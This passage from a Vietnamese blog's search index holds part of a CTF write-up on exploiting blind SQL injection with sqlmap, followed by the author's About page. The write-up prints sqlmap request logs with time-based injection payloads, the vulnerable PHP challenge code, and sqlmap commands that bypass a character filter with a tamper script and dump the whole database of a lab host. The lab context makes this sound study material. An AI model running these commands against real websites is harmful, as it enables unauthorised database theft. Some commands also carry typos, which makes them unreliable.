3190=DBMS_PIPE.RECEIVE_MESSAGE(CHR(69)||CHR(76)||CHR(103)||CHR(77),5) AND \u0026#39;gzMg\u0026#39;=\u0026#39;gzMg [16:50:19] [TRAFFIC OUT] HTTP request [#148]: POST /test/index.php HTTP/1.1 Host: 192.168.19.89 Accept-encoding: gzip,deflate Cache-control: no-cache Content-type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* User-agent: sqlmap/1.3.7#stable (http://sqlmap.org) Content-length: 204 Connection: close search_user_exist\u0026amp;username=%5C\u0026amp;name=OR%2F%2A%2A%2F1%3D1%23%27%20AND%203190%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2876%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%2C5%29%20AND%20%27gzMg%27%3D%27gzMg [16:50:19] [TRAFFIC IN] HTTP response [#148] (200 OK): Date: Wed, 28 Aug 2019 09:50:19 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.6 X-Powered-By: PHP/7.3.6 Content-Length: 14 Connection: close Content-Type: text/html; charset=UTF-8 URI: http://192.168.19.89:80/test/index.php h4x0r detected   Theo quan sát thì PAYLOAD đang sai, sqlmap sử dụng cả OR/**/1=1# của name nên nó bị sai, và space đang được sử dụng. Bây giờ mình phải chuyển tất cả space về /**/. Ở sqlmap có 1 tùy chọn rất hay là tamper. Để hiển thị danh sách các tamper có trong sqlmap thì sử dụng câu lệnhluôn. Mình hoàn toàn có thể custom lại tamper này của sqlmap.\nsqlmap --list-tampers   Thấy có * space2comment.py - Replaces space character (' ') with comments '/**/' nên sử dụng luôn. Vậy câu lệnh tiếp theo sẽ là:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; -p name --string=\u0026#34;User exist\u0026#34; --tamper=space2comment.py   Kiểm tra kết quả thì vẫn chưa được. Câu lệnh query vẫn đang sai. Do sqlmap nối luôn OR/**/1=1# vào payload nên đang bị sai. Chúng ta xóa nó đi và tiến hành chạy lại.\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; -p name --string=\u0026#34;User exist\u0026#34; --tamper=space2comment.py   Vẫn chưa được, kiểm tra lại với option -v 6 thì thấy rằng PAYLOAD đang sử dụng dấu comment là dấu --, mình phải đổi dấu -- thành dấu #. Sử dụng tùy chọn --suffix=\u0026quot;#\u0026quot; thì cuối mỗi PAYLOAD sẽ là dấu #.\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; -p name --string=\u0026#34;User exist\u0026#34; --tamper=space2comment.py --suffix=\u0026#34;#\u0026#34;` Parameter: name (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: search_user_exist\u0026amp;username=\\\u0026amp;name= AND (SELECT 1987 FROM (SELECT(SLEEP(5)))ApsW)# --- [17:02:55] [WARNING] changes made by tampering scripts are not included in shown payload content(s) [17:02:55] [INFO] the back-end DBMS is MySQL web application technology: Apache 2.4.39, PHP 7.3.6 back-end DBMS: MySQL \u0026gt;= 5.0.12    Đã hoạt động rồi. DB sử dụng MySQL, giờ chúng ta sử dụng lệnh --dump-all lấy tên DB và Table của dữ liệu ta cần lấy.\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026quot;search_user_exist\u0026amp;username=\\\u0026amp;name=\u0026quot; -p name --string=\u0026quot;User exist\u0026quot; --suffix=\u0026quot;#\u0026quot; --tamper=space2comment.py --dbms=mysql -D --dumpall-all   Có thể sử dụng các tùy chọn khác để lấy dữ liệu từ từ như --current-db chọn các dữ liệu mong muốn để lấy ra ngoài. D\n  Kết luận  sqlmap rất mạnh, hầu như có thể tấn công vào bất cứ web nào có dính lỗi SQL Injection. Vài điều lưu ý: Nếu sử dụng sqlmap mà k thấy ra kết quả thì sử dụng option -v để xem PAYLOAD truyền vào đúng ý mình chưa. Kiên trì thì sẽ hái được quả ngọt :D  ","permalink":"https://minhtuanact.github.io/content/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/","summary":"Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài \u0026lt;?php include \u0026#34;config.php\u0026#34;; function check_input($input) { $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;; if (empty($input)) return false; for ($i = 0 ; $i \u0026lt; strlen($input); $i++) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[\u0026#34;search_user_exist\u0026#34;])) { $username = $_POST[\u0026#34;username\u0026#34;]; $name = $_POST[\u0026#34;name\u0026#34;]; \u0026#34;hl_lines=5-6\u0026#34; if ( check_input($username) === false || check_input($name) === false) { die(\u0026#34;h4x0r detected\u0026#34;); } $sql = \u0026#34;SELECT id FROM users WHERE username=\u0026#39;$username\u0026#39; or name=\u0026#39;$name\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { die(\u0026#34;User exist\u0026#34;); } die(\u0026#34;No user\u0026#34;); } else { highlight_file(__FILE__); } ?","title":"Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF"},{"content":"About Me Học vấn  Sinh viên năm 5 tại Học viện Kỹ thuật Mật Mã (KMA)  Quê Quán  Sinh ra và lớn lên tại miền quê Bắc Giang yêu dấu  Sở thích  Thích rất nhiều thứ mỗi thứ 1 chút Thích ăn nhiều thứ (thành ra giờ mới béo vậy nầy T_T) Thích đi đây đi đó Thích đi xem phim nhưng k thích đi xem phim 1 mình Thích nghe nhạc: pop ballad, indie, rock ballad, \u0026hellip; Thích tự do  ","permalink":"https://minhtuanact.github.io/content/about/","summary":"About Me Học vấn  Sinh viên năm 5 tại Học viện Kỹ thuật Mật Mã (KMA)  Quê Quán  Sinh ra và lớn lên tại miền quê Bắc Giang yêu dấu  Sở thích  Thích rất nhiều thứ mỗi thứ 1 chút Thích ăn nhiều thứ (thành ra giờ mới béo vậy nầy T_T) Thích đi đây đi đó Thích đi xem phim nhưng k thích đi xem phim 1 mình Thích nghe nhạc: pop ballad, indie, rock ballad, \u0026hellip; Thích tự do  ","title":"About"}]